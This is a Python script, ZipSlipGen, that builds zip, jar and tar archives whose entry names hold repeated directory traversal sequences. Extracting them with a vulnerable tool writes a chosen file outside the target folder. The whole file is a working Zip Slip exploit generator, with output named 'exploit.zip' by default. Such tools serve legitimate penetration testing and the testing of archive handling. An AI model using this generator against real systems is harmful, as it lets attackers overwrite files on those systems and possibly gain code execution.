#!/usr/bin/env python
#
# Copyright (c) 2009, Neohapsis, Inc.
# Copyright (c) 2019, Lauri Haverinen
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met: 
#
#  - Redistributions of source code must retain the above copyright notice, this list 
#    of conditions and the following disclaimer. 
#  - Redistributions in binary form must reproduce the above copyright notice, this 
#    list of conditions and the following disclaimer in the documentation and/or 
#    other materials provided with the distribution. 
#  - Neither the name of the copyright holder nor the names of its contributors may be used to 
#    endorse or promote products derived from this software without specific prior 
#    written permission. 
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE 
# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR 
# ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES 
# (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; 
# LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON 
# ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT 
# (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS 
# SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. 


import sys, argparse, textwrap, zipfile, tarfile, os

def main():
	parser = argparse.ArgumentParser(
		prog='ZipSlipGen',
		formatter_class=argparse.RawDescriptionHelpFormatter,
		description=textwrap.dedent('''\
			-------------------------
			|	ZipSlipGen	|
			-------------------------
			Generate an archive that contains the
			input file with directory traversal
			characters. Supported extensions are zip,
			jar, tar, tar.bz2, tar.gz, and tgz.
			'''),
		usage='python zipslipgen.py [-h] -f <input_file> [options]')
	parser.add_argument('-f', '--filename', 
						dest='fname', 
						help='File to include in the archive.',
						default='')
	parser.add_argument('-o', '--output', 
						dest='out',
						help='Output filename, default=exploit.zip.', 
						default='exploit.zip')
	parser.add_argument('-d', '--depth', 
						type=int, 
						dest='depth', 
						help='Number of folders to traverse, default=8.', 
						default=8)
	parser.add_argument('-os', '--operating-system', 
						dest='platform',
						help='OS of the target filesystem (unix/win), default=win.', 
						default='win')
	parser.add_argument('-p', '--path', 
						dest='path',
						help='Path to include in filename after directory traversal, default=None', 
						default='')
	args = parser.parse_args()

	fname = args.fname
	if not os.path.exists(fname):
		sys.exit("No input file!")

	if args.platform == "win":
		dir = "..\\"
		if args.path and args.path[-1] != '\\':
			args.path += '\\'
	else:
		dir = "../"
		if args.path and args.path[-1] != '/':
			args.path += '/'

	zpath = dir*args.depth+args.path+os.path.basename(fname)
	print("Creating " + args.out + " containing " + zpath)
	ext = os.path.splitext(args.out)[1]
	if os.path.exists(args.out):
		wmode = 'a'
	else:
		wmode = 'w'
	if ext == ".zip" or ext == ".jar":
		zf = zipfile.ZipFile(args.out, wmode)
		zf.write(fname, zpath)
		zf.close()
		return
	elif ext == ".tar":
		mode = wmode
	elif ext == ".gz" or ext == ".tgz":
		mode = "w:gz"
	elif ext == ".bz2":
		mode = "w:bz2"
	else:
		sys.exit("Could not identify output archive format for " + ext)

	tf = tarfile.open(args.out, mode)
	tf.add(fname, zpath)
	tf.close()

if __name__ == '__main__':
	main()